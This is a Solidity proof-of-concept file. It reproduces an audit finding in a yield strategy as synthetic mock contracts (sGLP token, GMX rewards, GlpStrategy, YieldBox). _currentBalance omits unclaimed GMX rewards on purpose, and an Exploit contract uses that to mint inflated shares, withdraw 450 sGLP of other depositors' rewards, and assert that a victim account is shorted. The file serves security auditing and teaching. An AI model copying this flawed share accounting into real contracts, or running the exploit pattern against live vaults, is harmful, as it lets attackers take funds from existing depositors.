// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Tapioca GlpStrategy — _currentBalance omits GMX claimable rewards
    (Pashov, 2024-02, finding 31527 / C-02). SYNTHETIC, cheatcode-free.
    _currentBalance is the audited function (@> VULN).
    Root cause: share minting uses sGLP plus already-harvested rewards only.
    GMX rewards still sitting unclaimed are invisible, so a deposit mints too
    many shares. Harvest then pulls those rewards in, and the extra shares
    redeem them. Existing depositors are paid less than their GLP plus rewards. */

contract SGLP {
    string public name = "Staked GLP";
    string public symbol = "sGLP";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract GmxRewards {
    mapping(address => uint256) public claimable;

    function setClaimable(address who, uint256 amount) external {
        claimable[who] = amount;
    }

    function claim(address who) external returns (uint256 amount) {
        amount = claimable[who];
        claimable[who] = 0;
    }
}

contract GlpStrategy {
    SGLP public sglp;
    GmxRewards public gmx;
    uint256 public harvestedUnswapped;

    constructor(address _sglp, address _gmx) {
        sglp = SGLP(_sglp);
        gmx = GmxRewards(_gmx);
    }

    function pendingRewards() public view returns (uint256) {
        return harvestedUnswapped;
    }

    function currentBalance() external view returns (uint256) {
        return _currentBalance();
    }

    /// Audited body. `pendingRewards` is WETH already harvested and not yet swapped.
    /// Rewards still claimable on GMX are not here.
    function _currentBalance() internal view virtual returns (uint256 amount) {
        // @> VULN: sGLP on hand is the whole share price. GMX claimable is not added.
        amount = sglp.balanceOf(address(this));
        amount += pendingRewards();
    }

    function harvest() external {
        uint256 owed = gmx.claim(address(this));
        if (owed != 0) sglp.mint(address(this), owed);
    }

    function withdraw(address to, uint256 amount) external {
        sglp.transfer(to, amount);
    }
}

contract YieldBox {
    SGLP public sglp;
    GlpStrategy public strategy;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(address _sglp, address _strategy) {
        sglp = SGLP(_sglp);
        strategy = GlpStrategy(_strategy);
    }

    function seed(address owner, uint256 shares) external {
        balanceOf[owner] += shares;
        totalSupply += shares;
    }

    function deposit(uint256 amount) external returns (uint256 share) {
        uint256 totalAmount = strategy.currentBalance();
        uint256 supply = totalSupply;
        share = _toShares(amount, supply, totalAmount);
        balanceOf[msg.sender] += share;
        totalSupply = supply + share;
        strategy.harvest();
        sglp.transferFrom(msg.sender, address(strategy), amount);
    }

    function withdraw(uint256 share) external returns (uint256 amount) {
        uint256 totalAmount = strategy.currentBalance();
        amount = share * totalAmount / totalSupply;
        balanceOf[msg.sender] -= share;
        totalSupply -= share;
        strategy.withdraw(msg.sender, amount);
    }

    function preview(address owner) external view returns (uint256) {
        uint256 shares = balanceOf[owner];
        if (shares == 0 || totalSupply == 0) return 0;
        return shares * strategy.currentBalance() / totalSupply;
    }

    function _toShares(uint256 amount, uint256 supply, uint256 totalAmount) internal pure returns (uint256) {
        if (supply == 0 || totalAmount == 0) return amount;
        return (amount * supply + totalAmount - 1) / totalAmount;
    }
}

contract Exploit {
    uint256 public constant EXISTING = 1000e18;
    uint256 public constant REWARDS = 500e18;
    uint256 public constant DEPOSIT = 9000e18;
    uint256 public constant STOLEN = 450e18;
    address public constant VICTIM = 0x000000000000000000000000000000000000bEEF;

    SGLP public sglp; // nonce 1
    GmxRewards public gmx; // nonce 2
    GlpStrategy public strategy; // nonce 3
    YieldBox public yieldBox; // nonce 4

    uint256 public sharesOut;
    uint256 public withdrawn;

    constructor() {
        sglp = new SGLP();
        gmx = new GmxRewards();
        strategy = new GlpStrategy(address(sglp), address(gmx));
        yieldBox = new YieldBox(address(sglp), address(strategy));
        sglp.mint(address(strategy), EXISTING);
        yieldBox.seed(VICTIM, EXISTING);
        gmx.setClaimable(address(strategy), REWARDS);
        sglp.mint(address(this), DEPOSIT);
        sglp.approve(address(yieldBox), type(uint256).max);
    }

    function run() external {
        uint256 claimable = gmx.claimable(address(strategy));
        require(claimable == REWARDS, "rewards missing");

        uint256 accounted = strategy.currentBalance();
        require(accounted == EXISTING, "balance already includes GMX");

        uint256 share = yieldBox.deposit(DEPOSIT);
        sharesOut = share;
        require(share == DEPOSIT, "shares were not inflated");

        uint256 out = yieldBox.withdraw(share);
        withdrawn = out;
        require(out == DEPOSIT + STOLEN, "did not take 450 sGLP");
        require(sglp.balanceOf(address(this)) == DEPOSIT + STOLEN, "attacker balance");

        uint256 victimLeft = yieldBox.preview(VICTIM);
        require(victimLeft == EXISTING + REWARDS - STOLEN, "victim was not shorted");
    }
}
